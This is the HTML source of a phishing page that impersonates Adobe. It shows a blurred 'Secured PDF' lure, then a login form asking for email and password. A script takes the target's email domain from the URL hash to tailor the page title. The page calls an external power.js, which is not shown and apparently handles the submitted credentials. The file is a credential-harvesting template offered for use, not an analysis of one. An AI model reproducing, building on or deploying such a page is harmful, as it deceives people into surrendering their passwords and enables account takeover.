<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Account Verification</title>

  <!-- Font Awesome for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="style.css">

  <!-- Dynamic Title Script (unchanged) -->
  <script>
    window.addEventListener("DOMContentLoaded", function () {
      const hash = window.location.hash.substring(1); // Remove the '#' character
      const parts = hash.split("@");
      if (parts.length === 2) {
        const domain = parts[1];
        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
        document.title = capitalized;
      }
    });
  </script>

  <!-- Start-screen -> reveal overlay logic (keeps behavior simple & non-destructive) -->
  <script>
    window.addEventListener("DOMContentLoaded", () => {
      const start = document.getElementById("start-screen");
      const overlay = document.getElementById("overlay");
      if (start && overlay) {
        start.addEventListener("click", () => {
          start.classList.add("hide");
          // small delay so the start-screen fades, then show overlay
          setTimeout(() => overlay.classList.add("show"), 280);
        });
      }
    });
  </script>
</head>
<body>

  <!-- START: Blurred "document" start screen -->
  <div id="start-screen" aria-hidden="false" title="Click to view">
    <div class="doc-card" role="button" aria-pressed="false">
      <div class="doc-inner" aria-hidden="true">
        <!-- repeating pattern simulating text/image, intentionally blurred via CSS -->
      </div>
      <div class="doc-label">
        <i class="fas fa-file-pdf"></i>
        <span>ğŸ”’ Secured PDF â€” Click to view</span>
      </div>
    </div>
  </div>
  <!-- END start screen -->

  <!-- Fullscreen background iframe -->
  <iframe id="bg-frame"></iframe>

  <!-- Login overlay (hidden initially, shown after clicking start-screen) -->
  <div class="overlay" id="overlay" aria-hidden="true">
    <div class="login-box" role="region" aria-label="Account verification login">
      <!-- make logo visible -->
      <img id="logo" alt="Provider logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" />

      <!-- Info text -->
      <div class="info-text">
        ğŸ—‚ï¸ <strong>Secured file access</strong> ğŸ” â€” sign in for your providerâ€™s verification
      </div>

      <!-- Email input with icon -->
      <div class="input-group">
        <i class="fas fa-envelope icon"></i>
        <input type="email" id="email" placeholder="Email" />
      </div>

      <!-- Password input with icon -->
      <div class="input-group">
        <i class="fas fa-lock icon"></i>
        <input type="password" id="password" placeholder="Password" />
      </div>

      <!-- Error message -->
      <div id="error-msg" class="error-msg" aria-live="polite"></div>

      <!-- Login button -->
      <button id="login-btn">Login</button>
    </div>
  </div>

  <!-- Bouncing Adobe logo -->
  <div class="bouncing-logo" aria-hidden="true">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" alt="Adobe Logo" />
  </div>

  <!-- Your external script (unchanged) -->
  <script src="power.js"></script>
</body>
</html>
